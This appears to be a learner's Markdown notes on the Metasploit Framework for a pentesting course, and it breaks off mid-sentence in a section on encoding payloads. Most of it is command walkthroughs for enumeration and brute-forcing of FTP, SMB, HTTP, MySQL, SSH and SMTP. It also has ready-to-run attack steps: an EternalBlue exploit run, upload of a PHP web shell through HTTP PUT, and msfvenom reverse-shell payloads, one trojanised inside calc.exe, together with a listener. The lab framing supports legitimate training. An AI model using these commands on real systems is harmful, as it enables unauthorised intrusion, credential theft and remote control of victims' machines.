# Table of Contents

- [Metasloit Framework Overview](#1)
  - [Introduction to Metasploit](#1.1)
    - [Terminology](#1.1.1)
    - [Metasploit Framework Interfaces](#1.1.2)
      - [Metasploit Console](#1.1.2.1)
      - [MSFcli](#1.1.2.2)
      - [Metasploit Community Edition](#1.1.2.3)
      - [Armitage](#1.1.2.4)
  - [Metasploit Architecture](#1.2)
    - [Metasploit Modules](#1.2.1)
    - [Types of payloads](#1.2.2)
    - [Meterpreter Payload](#1.2.3)
    - [Metasploit Modules Locations](#1.2.4)
  - [Pentesting with Metasploit](#1.3)
    - [Penetration Testing Execution Standard](#1.3.1)
    - [Pentesting Phases](#1.3.2)
    - [How the Metasploit Framework is integrated into each phase.](#1.3.3)
- [Metasploit Fundamentals](#2)
  - [Installation and configuration](#2.1)
    - [The Metasploit Framework Database](#2.1.1)
  - [MSFConsole fundamentals](#2.2)
    - [What we need to know](#2.2.1)
    - [Metasploit Variables](#2.2.1)
  - [Creating and managing a workspace](#2.3)
- [Information Gathering and Enumeration with Metasploit](#3)
  - [Port scanning and enumeration with Nmap](#3.1)
  - [Port scanning and enumeration with auxiliary modules](#3.2)
    - [Lab Infrastructure](#3.2.1)
  - [FTP Enumeration](#3.3)
  - [SMB Enumeration](#3.4)
  - [Web Server Enumeration](#3.5)
  - [MySQL Enumeration](#3.6)
  - [SSH Login](#3.7)
  - [SMTP Enumeration](#3.8)
- [Vulnerability Scanning](#4)
  - [Using MSF](#4.1)
  - [Using Nessus](#4.2)
  - [Using Nmap](#4.3)
- [Client-Side Attacks](#5)
  - [Generating payloads with MsfVenom](#5.1)
  - [Encoding payloads with MsfVenom](#5.2)
  - [Automating Metasploit with Resource Scripts](#5.3)
- [Exploitation](#6)
  - [Windows Exploitation](#6.1)
    - [Exploiting an HTTP File Server](#6.1.1)
    - [Exploiting SMB](#6.1.2)
    - [Exploiting WinRM](#6.1.3)
    - [Exploiting Tomcat](#6.1.4)
  - [Linux Exploitation](#6.2)
    - [Exploiting FTP](#6.2.1)
    - [Exploiting Samba](#6.2.2)
    - [Exploiting SSH](#6.2.3)
    - [Exploiting SMTP](#6.2.4)
- [Post-Exploitation](#7)
  - [Post-exploitation Fundamentals](#7.1)
    - [Meterpreter Fundamentals](#7.1.1)
    - [Upgrading Shells](#7.1.2)
  - [Windows Post-exploitation](#7.2)
  - [Linux Post-exploitation](#7.3)

<a id=1></a>
# Metasloit Framework Overview

<a id=1.1></a>
## Introduction to Metasploit

The Metasploit Framework is an open-source tool developed for penetration testing.

It provides pentesters with a robust infrastructure required to automate every stage of
a pentest.

It's also used by exploit developers to develop and test their new exploits.

The Metasploit Framework is designed to be modular, allowing for new functions to be added easily
by the user.

The framework was developed initially by HD Moore in 2003. It was originally written in Perl.

It was then acquired by Rapid7 in 2009 and rewritten in Ruby.

There are three editions of Metasploit:

- Metasploit Pro (Commercial)
- Metasploit Express (Commercial)
- Metasploit Framework (Community)

<a id=1.1.1></a>
### Terminology

- Interface: Methods of interaction with the Metasploit Framework.
- Module: Pieces of coda that performa a particular task, an example of a module is an exploit.
- Vulnerability: weakness or flaw in a computer system.
- Exploit: piece of code that is used to take advantage of a vulnerability
- Payload: piece of code delivered to the target by an exploit to execute arbitrary commands.
- Listener: a utility that listens for incoming connections.

<a id=1.1.2></a>
### Metasploit Framework Interfaces

<a id=1.1.2.1></a>
#### Metasploit Console.

All-in-one interface that provides us with complete access to all functionalities of the
Metasploit Framework.

<a id=1.1.2.2></a>
#### MSFcli

The msfcli is a command line utility used to facilitate the communications between another
tools to the Metasploit Console.

It was discontinued, but the same functionality can be obtained using the console.

<a id=1.1.2.3></a>
#### Metasploit Community Edition

Is a web-based GUI front-end for the MSF console that simplifies network discovery and vulnerability
identification. 

<a id=1.1.2.4></a>
#### Armitage

It's a GUI-based Metasploit Console written in Java.

<a id=1.2></a>
## Metasploit Architecture

A module in the context of MSF, is a piece of code that can be used by the MSF

The MSF libraries facilitate the execution of modules without having to write the code
necessary in order to execute them.

- Libraries: MSFbase, MSFcore, Rex
- Modules: exploit, payload, encoder, nop, auxiliary

<a id=1.2.1></a>
### MSF Modules

- Exploit: a module used to take advantage of a vulnerability and is typically paired with
a payload.
- Payload: code that is delivered by MSF and remotely executed on the target after successful exploitation.
- Encoder: used to encode payloads in order to avoid AV detection. For example, `shikaga_ga_nai` is used to
encode Windows payloads.
- NOPS: used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed.
- Auxiliary: a module that is used to perform additional functionality like port scanning and enumeration.

<a id=1.2.2></a>
### Types of payloads:

- Non-staged: payload that is sent to the target system along the exploit.
- Staged: payload that is sent to the target after the exploit has been successful.
	- stager: contains a payload used to establish a reverse connection to the attacker.
	- stage: the actual payload, responsible for executing arbitrary commands.

<a id=1.2.3></a>
### Meterpreter payload

The meterpreter payload is an advanced multi-functional framework allocated in memory of the target.
Being in memory makes it harder for antivirus to detect it.

It communicates over a stager socket and provide the attacker with an interactive command inteperter
on the exploited system. 

<a id=1.2.4></a>
### MSF Module Locations

```bash
/usr/share/metasploit-framework/modules # built-in modules
~/.ms4/modules # custom modules
```

<a id=1.3></a>
## Pentesting with Metasploit

The MSF can be used to perform and automate various tasks that fall under the pentest life cycle.

We will explore the various phases of a pentest to understand how to use the framework.

We will adopt the PTES (Pentest Execution Standard) as a roadman to understand the various
phases that make up a pentest and how Metasploit can be integrated into each phase.

<a id=1.3.1></a>
### Penetration Testing Execution Standard

The PTES is a pentesting methodology that was developed by a team of IS practicioners with the
aim of addressing the need for a comprehensive and up-to-date standard for pentesting.

[Check the wiki clicking here](http://www.pentest-standard.org/index.php/Main_Page)

<a id=1.3.2></a>
### Pentesting Phases

- Information gathering
- Enumeration
- Exploitation
- Post-exploitation
	- Privilege escalation
	- Mantaining persistent access
	- Clearing tracks

<a id=1.3.3></a>
### How the Metasploit Framework is integrated into each phase.

| PTES Phase                                    | Metasploit Implementation     |
| --------------------------------------------- | ----------------------------- |
| Information gathering and enumeration         | Auxiliary modules             |
| Vulnerability scanning                        | Auxiliary modules, Nessus     |
| Exploitation                                  | Exploit modules and paylaods  |
| Post-exploitation                             | Meterpreter                   |
| Privilege escalation                          | Post-exploitation modules     |
| Mantaning persistent access                   | Post-exploitation modules     |

<a id=2></a>
# Metasploit Fundamentals

<a id=2.1></a>
## Installion and configuration

The MSF is distributed by Rapid7 and can be downloaded and installed as a standalone package on both
Windows and Linux.

Nevertheless, we will use Linux. Kali, Parrot and Blackarch can be used. In neither distro do we have to install
anything, but we should update our packages. 

<a id=2.1.1></a>
### The Metasploit Framework Database

The msfdb is an integral part of the framework and is used to keep track of all you assessments, host data scans, etc.

The framework uses PostgreSQL as the primary database server, as a result, we will also need to ensure that the PostgreSQL
database service is running and configured correctly.

It also facilitates the importation of storaged scan results from tools like Nessus or Nmap.

```bash
$ sudo pacman -S metasploit-framework
$ sudo systemctl enable postgresql
$ sudo systemctl start postgresql
$ sudo msfdb init 
```

<a id=2.2></a>
## MSFConsole Fundamentals

Before starting to pentest, we need to get a grasp on how to utilize the MSF console.

The console is an easy-to-use AIO interface that gives us complete access to the framework.

Every phase of the pentest can be done from here.

<a id=2.2.1></a>
### What we need to know.

1. How to search for modules.
2. How to select modules.
3. How to configure module options and variables.
4. How to search for payloads.
5. Managing sessions.
6. Additional funcitonality
7. Saving our configurations

<a id=2.2.2></a>
### MSF Module Variables

Modules will typically require information like target IPs or ports to begin exploitation.

There options are configured through MSF set variables.

The console allows us to set local and global variable values.

Let's see some common types of variables.

| Variable      | Purpose                                                                               |
| ------------- | ------------------------------------------------------------------------------------- |
| LHOST         | Our address. Used to configure payloads and correctly set up listeners.               |
| LPORT         | A port for our listener to hear.                                                      |
| RHOST         | A remote host. Our target.                                                            |
| RHOSTS        | An amount of remote hosts. Some modules allow for multiple uses at the same time.     |
| RPORT         | Port to attack.                                                                       |

Let's use the console!

```bash
msf6 > help 
# print the help menu.
msf6 > version 
# display the metasploit version
msf6 > show all 
# print all the available modules 
msf6 > show exploits 
# print only exploit modules
# lets do something practical like a scan.
msf6 > search portscan
# this will list some modules.
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > options
# prints the options of the current module
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 127.0.0.1
# sets the rhosts variable.
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
# set a range of ports to scan.
msf6 auxiliary(scanner/portscan/tcp) > run
# starts the scan
msf6 > search cve:2017 type:exploit platform:windows
# filter by searching only CVE exploits on windows
msf6> search eternalblue
# searches for an eternalblue exploit
msf6> connect [TARGET] [PORT]
# helpful to do banner grabbing
```

<a id=2.3></a>
## Creating and managing a workspace

Workspaces allow us to keep track of all the hosts, scans and activities and is extremely useful when
conducting penetration tests as they allow us to sort and organize the data.

The console provides us with the ability to create, manage and switch between multiple workspaces
depending on the requirements we have.

We will be using workspaces to organize our assignments as we progress through the course.

Lets see how to do it! 

```bash
msf6 > db_status
# checks the msfdb status
msf6 > workspace -h 
# prints workspace help
msf6 > workspace
# shows existing workspaces
msf6 > hosts
# prints the hosts stores in the workspace
msf6 > workspace -a [WORKSPACE NAME]
# creates and switches to a workspace
msf6 > workspace [EXISTING_WORKSPACE]
# switches to a workspace
msf6 > workspace -d [WORKSPACE]
# deletes a workspace
msf6 > workspace -r [OLD_WORKSPACE_NAME] [NEW_WORKSPACE_NAME]
# renames a workspace
```

<a id=3></a>
# Information Gathering and Enumeration with Metasploit

<a id=3.1></a>
## Port scanning and enumeration with Nmap

Nmap is a free and open source tool to perform network scans, port scans a more features.

It can also be used to enumerate services running on a machine.

We can output the results of Nmap to the Metasploit Console in a format that can be imported
to the console and later used in our pentesting.

```bash
$ nmap [TARGET]
# perform an everyday scan with Nmap.
$ nmap [TARGET] -oX [FILENAME]
# this will output the scan results into an XML file. this file will be used and
# imported to the msfconsole for later use.
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > workspace [NAME]
# lets first create a workspace before loading the XML file.
msf6 > db_import /path/to/file.xml
# this will load the file and be accessible from the msfconsole database
msf6 > services
# displays the services known to the database
msf6 > db_nmap [NMAP_OPTIONS] [TARGET]
# perform an nmap scan directly from the msfconsole. this will automatically take the
# data and store it in the database
msf6 > vulns
# if we were to find a vulnerability, it will be stored there
```

<a id=3.2></a>
## Port scanning and enumeration with auxiliary modules

Auxiliary modules are used to perform scans, discovery and fuzzing.

We can use them to perform both TCP and UDP port scanning as well as enumerating information
from services like FTP, SSH, etc.

These can be used during the information gathering phase of a penetetration test.

We can also run scans after exploitation on the target network.

Auxiliary modules, while very useful during recon, are most powerful on the post-exploitation
phase of the pentest.

<a id=3.2.1></a>
### Lab Infrastructure

Our objetive in this lab will be to utilize auxiliary modules to discover open ports on our
first target.

The next step will involve exploiting the service running on the target in order to obtain
a foothold.

From then we will pivot to different servers using scanning and exploits.

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options
# we need to choose the RHOSTS and RPORT range.
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS [NETWORK_CIDR_TARGET] {OR} [TARGET]
msf6 auxiliary(scanner/portscan/tcp) > set RPORT 1-1000
# a more thorough port-scan would consider a range from 1 to 65535.
meterpreter > shell
ip a
# this will give us the IP address from the machine. from this we can scan the internal
# network. 
meterpreter > run autoroute -s [INTERNAL_TARGET]
meterpreter > bg
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS [INTERNAL_TARGET]
msf6 auxiliary(scanner/portscan/tcp) > run
# done! we have successfully scanned the internal target.
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/discovery/udp_sweep
msf6 auxiliary(scanner/discovery/udp_sweep) > set [TARGET]
```

<a id=3.3></a>
## FTP Enumeration

We can use auxiliary modules to enumerate information as well as perform bruteforce attacks
on targets running an FTP service.

FTP authentication utilizes a username and password, however in some cases a misconfigured FTP
server may use anonymous logins, which consists on user anonymous and a blank password.

```bash
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > workpace -a FTP_Enumeration
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS [TARGET]
msf6 auxiliary(scanner/portscan/tcp) > set RPORT 21
msf6 auxiliary(scanner/portscan/tcp) > run
# service is UP
msf6 auxiliary(scanner/portscan/tcp) > search ftp
# a shit ton of FTP modules appear.
msf6 auxiliary(scanner/portscan/tcp) > search type:auxiliary name:ftp
# reduced search
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS [TARGET]
msf6 auxiliary(scanner/ftp/ftp_version) > run
msf6 auxiliary(scanner/ftp/ftp_version) > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /path/to/usernames
msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /path/to/passwords
# msfconsole has built-in user and password lists for bruteforcing, so we dont have to pass
# a list to the module.
msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS [TARGET]
msf6 auxiliary(scanner/ftp/ftp_login) > set THREADS [THREADS]
# you can change the number of concurrent tasks. improves speed, but its noisy!
# and maybe the FTP server won't like that.
msf6 auxiliary(scanner/ftp/ftp_login) > run
msf6 auxiliary(scanner/ftp/ftp_login) > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS [TARGET]
msf6 auxiliary(scanner/ftp/anonymous) > run
# if an ftp shell is not opened, then the service is not misconfigured.
msf6 auxiliary(scanner/ftp/anonymous) > 
msf6 auxiliary(scanner/ftp/anonymous) > 
```

<a id=3.4></a>
## SMB Enumeration

We will use auxiliary modules to scan an SMB service, its shares and more.

We can scan both SMB and Samba services. They're both found on 445, although older
versions are on 139 and 445.

```bash
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > workspace -a SMB_Enumeration
msf6 > setg RHOSTS [TARGET]
# set the target as global variable.
msf6 > search type:auxiliary name:smb
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > run
msf6 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers) > run
# as a lot of SMB/Samba servers allow NULL sessions, in most cases its not necessary
# to set the user and password variables. but we can do it, though.
msf6 auxiliary(scanner/smb/smb_enumusers) > set SMBUser [USER]
msf6 auxiliary(scanner/smb/smb_enumusers) > set SMBPass [PASSWORD]
msf6 auxiliary(scanner/smb/smb_enumusers) > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set ShowFiles true
# optional variable. this will spider and show us the files within the shares.
msf6 auxiliary(scanner/smb/smb_enumshares) > run
# again, its not necessary to set credentials, but lets do it anyway.
msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBUser [USER]
msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBPass [PASSWORD]
msf6 auxiliary(scanner/smb/smb_enumshares) > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser admin 
# we will only select one user.
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /path/to/passwords
msf6 auxiliary(scanner/smb/smb_login) > set STOP_ON_SUCCESS true
# stops the bruteforce whenever we get a hit.
msf6 auxiliary(scanner/smb/smb_login) > run
msf6 auxiliary(scanner/smb/smb_login) > exit
msf6 > exit
$ smbclient -L \\\\[TARGET]\\ -U admin
# this is outside the console, but its good to know. the previous command enumerates
# the shares on the target
$ smbclient \\\\[TARGET]\\[SHARE]-U admin
smb: \> haxxord
```

<a id=3.5></a>
## Web Server Enumeration

We will use auxiliary modules to enumerate and scan a web server. Some of them are Apache, 
IIS, Nginx and more. Most of the time they're located at port 80, 443, 8080 and 8888.

```bash
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > workspace -a WS_Enum
msf6 > setg RHOSTS [TARGET]
msf6 > setg RHOST [TARGET]
msf6 > search type:auxiliary name:http
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > run
msf6 auxiliary(scanner/http/http_version) > use auxiliary/scanner/http/http_header
msf6 auxiliary(scanner/http/http_header) > run
msf6 auxiliary(scanner/http/http_header) > use auxiliary/scanner/http/robots_txt
msf6 auxiliary(scanner/http/robots_txt) > run
msf6 auxiliary(scanner/http/robots_txt) > curl http://[TARGET]/[PATH]
# we can check the disallowed directories.
msf6 auxiliary(scanner/http/) > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set DICTIONARY /path/to/http_paths
# the console uses a default dict, so we dont need to change it.
msf6 auxiliary(scanner/http/dir_scanner) > run
msf6 auxiliary(scanner/http/files_dir) > set EXT [EXTENSION]
# search for particular type of files.
msf6 auxiliary(scanner/http/files_dir) > use auxiliary/scanner/http/http_login
msf6 auxiliary(scanner/http/http_login) > set AUTH_URI /path/to/http_login
msf6 auxiliary(scanner/http/http_login) > set BRUTEFORCE_SPEED [1-5]
msf6 auxiliary(scanner/http/http_login) > unset USERPASS_FILE 
msf6 auxiliary(scanner/http/http_login) > set USER_FILE /path/to/user
msf6 auxiliary(scanner/http/http_login) > set PASS_FILE /path/to/passwords
msf6 auxiliary(scanner/http/http_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/http/http_login) > set VERBOSE false
# we can make it so it doesn't show failed attempts. i don't like this because i feel
# like nothing is happening lol
msf6 auxiliary(scanner/http/http_login) > run
msf6 auxiliary(scanner/http/http_login) > use auxiliary/scanner/http/apache_userdir_enum
msf6 auxiliary(scanner/http/apache_userdir_enum) > set USER_FILE /path/to/users
msf6 auxiliary(scanner/http/apache_userdir_enum) > run
```

<a id=3.6></a>
## MySQL Enumeration

MySQL is a DBMS (Database Management System) based on SQL. It runs on port 3306, but it can
be hosted on other ports.

We can use auxiliary modules to enumerate versions, tables and more.

```bash
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > workspace -a MySQL_Enum
msf6 > setg RHOST [TARGET]
msf6 > setg RHOSTS [TARGET]
msf6 > search type:auxiliary name:mysql
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) > set RPORT [3306-OTHER]
msf6 auxiliary(scanner/mysql/mysql_version) > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_version) > run
msf6 auxiliary(scanner/mysql/mysql_login) > set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /path/to/passwords
msf6 auxiliary(scanner/mysql/mysql_login) > search mysql_enum
msf6 auxiliary(scanner/mysql/mysql_login) > use auxiliary/admin/mysql/mysql_enum
msf6 auxiliary(admin/mysql/mysql_enum) > set PASSWORD [PASSWORD]
msf6 auxiliary(admin/mysql/mysql_enum) > set USERNAME [USERNAME]
msf6 auxiliary(admin/mysql/mysql_enum) > use auxiliary/admin/mysql/mysql_sql
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD [PASSWORD]
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME [USERNAME]
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL [QUERY]
msf6 auxiliary(admin/mysql/mysql_sql) > use auxiliary/scanner/mysql/mysql_schemadump
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD [PASSWORD]
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME [USERNAME]
msf6 auxiliary(scanner/mysql/mysql_schemadump) > exit
$ mysql [TARGET] -u root -p
msf6 > use auxiliary/scanner/mysql/mysql_writable_dirs
msf6 auxiliary(scanner/mysql/mysql_writable_dirs) > set DIR_LIST /path/to/dirs
msf6 auxiliary(scanner/mysql/mysql_writable_dirs) > set USERNAME [USERNAME]
msf6 auxiliary(scanner/mysql/mysql_writable_dirs) > set PASSWORD [PASSWORD]
msf6 auxiliary(scanner/mysql/mysql_writable_dirs) > set FILE_NAME [TEST_FILE_NAME]
msf6 auxiliary(scanner/mysql/mysql_writable_dirs) > use auxiliary/scanner/mysql/mysql_hashdump
msf6 auxiliary(scanner/mysql/mysql_hashdum) > set USERNAME [USERNAME]
msf6 auxiliary(scanner/mysql/mysql_hashdum) > set PASSWORD [PASSWORD]
```

<a id=3.7></a>
## SSH Enumeration and Login

SSH (Secure Shell) is an authentication-based service used to remotely access a system. It's widely
used by system administrators and regular users to run commands on a system.

```bash
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > workspace -a SSH_Enum 
msf6 > set RHOST [TARGET]
msf6 > set RHOSTS [TARGET]
msf6 > search type:auxiliary name:ssh
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiiary(scanner/ssh/ssh_version) > run
msf6 auxiiary(scanner/ssh/ssh_version) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiiary(scanner/ssh/ssh_login) > set USER_FILE /path/to/usernames
msf6 auxiiary(scanner/ssh/ssh_login) > set PASS_FILE /path/to/passwords
msf6 auxiiary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiiary(scanner/ssh/ssh_login) > run
msf6 auxiiary(scanner/ssh/ssh_login) > use auxiliary/scanner/ssh/ssh_enumusers
msf6 auxiiary(scanner/ssh/ssh_enumusers) > set USER_FILE /path/to/users
msf6 auxiiary(scanner/ssh/ssh_enumusers) > 
```

<a id=3.8></a>
## SMTP Enumeration

SMTP (Simple Mail Transfer Protocol) is a protocol used to send emails. It typically runs on port
587, although older versions ran on port 25. Other common ports are 465 and 2525.

Implementations like Postfix run on port 25 by default, but its usually changed to 587.

```bash
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > workspace -a SMTP_Enum
msf6 > setg RHOST [TARGET]
msf6 > setg RHOSTS [TARGET]
msf6 > search type:auxiliary name:smtp
msf6 > use auxiliary/scanner/smtp/smtp_version
msf6 auxiliary(scanner/smtp/smtp_version) > set RPORT [PORT]
# change is default port is not 587.
msf6 auxiliary(scanner/smtp/smtp_version) > run
msf6 auxiliary(scanner/smtp/smtp_version) > use auxiliary/scanner/smtp/smtp_enum
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /path/to/usernames
# this module has two auxiliary actions: verify and EXPN. the username list can be
# a list of known employee names gained through passive recon. this may be formated in
# name.lastname, first_letter_of_first_name+lastname, first_name+last_name. this are some of 
# the most common formats for enterprise emails.
msf6 auxiliary(scanner/smtp/smtp_enum) > set UNIXONLE [TRUE/FALSE]
# this option will be true or false depending on the SMTP implementation we're trying to enumerate.
# if you know by the version scan that it is running Postfix or another SMTP service for *nix, then
# you may set this variable to true.
msf6 auxiliary(scanner/smtp/smtp_enum) > run
```

<a id=4></a>
# Vulnerability Scanning

Vulnerability scanning is the process of enumerating and finding the vulnerabilities
within a certain system or systems and verifying if they can be exploited.

<a id=4.1></a>
## Using MSF

The Metasploit Console has several modules that will help us find and exploit vulnerabilities.
Mutiple scanner and exploit modules can be used to run vulnerability scans on objectives.

This information will be useful during the pentest, as this will be what the customer might
want or need to fix.

We will use the [Metasploitable 3](https://github.com/rapid7/metasploitable3) machine to test our auxiliary
and exploit modules. 

```bash
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > workspace -a Vuln_Scan
msf6 > setg RHOST [TARGET]
msf6 > setg RHOSTS [TARGET]
msf6 > db_nmap -sS -sV -O [TARGET] {-p-}
# the -p- flag is optional, but it would be recommended to use on an actual pentest,
# due to the several amount of ports and services that may be exploited.
msf6 > hosts
msf6 > services
# this commands perform a query on the postgresql database that contains the output
# of the nmap command that we ran with db_nmap.
msf6 > search type:exploit name:Microsoft IIS
# search and keep searching until you find a suitable exploit for the target. this might
# be tedious, but we need to do it.
msf6 > use exploit/multi/http/glassfish_deployer
msf6 exploit(multi/http/glassfish_deployer) > info
# check what versions this exploit targets
msf6 exploit(multi/http/glassfish_deployer) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/http/glassfish_deployer) > set APP_RPORT [PORT]
msf6 exploit(multi/http/glassfish_deployer) > set USERNAME [USERNAME]
msf6 exploit(multi/http/glassfish_deployer) > back
# we'll check this later.
msf6 > searchsploit "[SERVICE]"
# this is an external command, useful to find exploits on the internet.
msf6 > searchsploit "[SERVICE]" | grep -e "Metasploit"
# this will only show Metasploit modules.
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiiary(scanner/smb/smb_ms17_010) > run
msf6 auxiiary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
# Metasploitable 3 is vulnerable to the MS17-010, so this will probably work.
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > exit
$ sudo wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb /opt/metasploit/plugins
# for arch linux
$ sudo wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb /usr/share/metasploit/plugins
# for ubuntu and others
$ msfconsole
msf6 > load db_autopwn
msf6 > db_autopwn -p -t 
# this will run exploits for ALL ports regardless of SERVICE!
msf6 > db_autopwn -p -t -PI [PORT]
# this will only target the given ports REGARDLESS OF SERVICE! it based the exploitation on
# typically found services on N port.
msf6 > analyze
# this will check for exploits and tell them to you what vulnerabilities are available for exploitation.
msf6 > vulns
# everything found by the analyze command will be put here.
```

<a id=4.2></a>
## Using Nessus

Nessus is a proprietary vulnerability scanner developed by Tenable that allows pentesters
to automatically scan vulnerabilities on a server or more. It does so by fingerprinting a host
and its services and trying comparing the service version with the Tenable database.

We can export the Nessus scan to the Metasploit Console database.

We will use the Nessus Essentials that will allow us to can upto 16 different IPs.

```bash
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > db_import
# this will show all the compatible tools we can import data from to the msfconsole.
msf6 > db_import nessus_scan.nessus
msf6 > vulns
# this will show the entire db of vulns.
msf6 > vulns -p [PORT]
# this will display vulnerabiliites associated with the given port(s).
```

<a id=4.3></a>
## Using WMAP

WMAP is a Metasploit plugin that was developed to do web scanning and vulnerability scanning
on webpages.

It can be used as its own standalone tool, but since its very old, it's not used that much nowadays.
It's been replaced by OWASP ZAP, Nikto and other tools.

Nevertheless, it is directly implemented within the MSFConsole, so we can use it there.

```bash
$ systemctl start postgresql && msfdb init && msfconsole
msf6 > workspace -a WMAP_Enum
msf6 > load wmap
msf6 > setg RHOST [TARGET]
msf6 > setg RHOSTS [TARGET]
msf6 > wmap_sites -a [IP]
# add a site to the database. this will not exploit anything, just store the URL.
msf6 > wmap_targets -t [WEBSITE_ADDRESS]
# when we run the wmap plugin, this sites will be scanned.
msf6 > wmap_run -t
# this will test the target site to check which modules should be used.
msf6 > wmap_run -e
# this will start the scan. what wmap does it practically simple. it runs all auxiliary modules
# available to scan a certain website. thats all it does really.
msf6 > wmap_vulns
# this will display all the vulnerabilities that wmap found.
# on the msf3 machine the PUT method is available. lets try it.
msf6 > use auxiliary/scanner/http/http_put
msf6 auxiliary(scanner/http/http_put) > set PATH /data/
msf6 auxiliary(scanner/http/http_put) > run
msf6 auxiliary(scanner/http/http_put) > set FILEDATA "<?php system($_GET['cmd']); ?>"
msf6 auxiliary(scanner/http/http_put) > set FILENAME shell.php
msf6 auxiliary(scanner/http/http_put) > run
```

<a id=5></a>
# Client-Side Attacks

Client-side attacks is a vector that involves coercing a client to execute a malicious file on their system
that will give us a connection to the machine.

This attack uses several social-engineering techniques to be useful and prosperous. It can be very simple to trick
someone into opening a portable executable (PE).

<a id=5.1></a>
## Generating payloads with MsfVenom

MsfVenom is a tool that allows us to create payloads. It can use templates (already existing executable files
that are injected with malicious code) or bare payloads.

This payloads are used to generate a connection between the attacker and the target. It may be a bind connection
or a reverse connection. It will depend on the situation and what we can do.

```bash
$ msfvenom -h
# check the flags...
$ msfvenom --list payloads
# get the list of all the available payloads. we will focus on meterpreter payloads.
$ msfvenom --list formats
# get the list of all the available formats.
$ msfvenom {-a [ARCHITECTURE]} -p [PAYLOAD] -f [FORMAT] -o [OUTPUT_FILE] LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT]
# if the payload is meterpreter/reverse... its a staged payload. but if it is meterpreter_reverse_tcp, its inline.
$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp -f exe -o payload.exe  LHOST=192.168.1.100 LPORT=9999
# windows 32bit payload
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] -f elf -o payload
# linux 32bit payload
$ msfvenom -x calc.exe -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] -f exe -o funny_calc.exe
# uses a template (executable file) to hide the payload. the calc.exe won't work though.
$ msfvenom -x calc.exe -k -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] -f exe -o funny_calc.exe
# the -k flag will try to preserver the original functionality of the template file.
# ok, the payload is done... now what?
$ sudo systemctl start postgresql && msfdb init && msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload [PAYLOAD]
msf6 exploit(multi/handler) > set LHOST [ATTACKER_IP]
msf6 exploit(multi/handler) > set LPORT [ATTACKER_PORT]
msf6 exploit(multi/handler) > run
# execute the payload and you'll have a meterpreter session!!
# if you're using a template, its recommended to do the following.
meterpreter >  run post/windows/manage/migrate 
# we wont see this module right now, but later we might... :)
```

<a id=5.2></a>
## Encoding payloads with MsfVenom

We can use msfvenom to encode payloads. This is used to obfuscate the code made by the payload. Some people
think that this encoders are used to evade antivirus, but this is not true. Although it could be useful for that
particular task, its not its main function. Maybe it will help evading signature-based AVs, but those nowadays
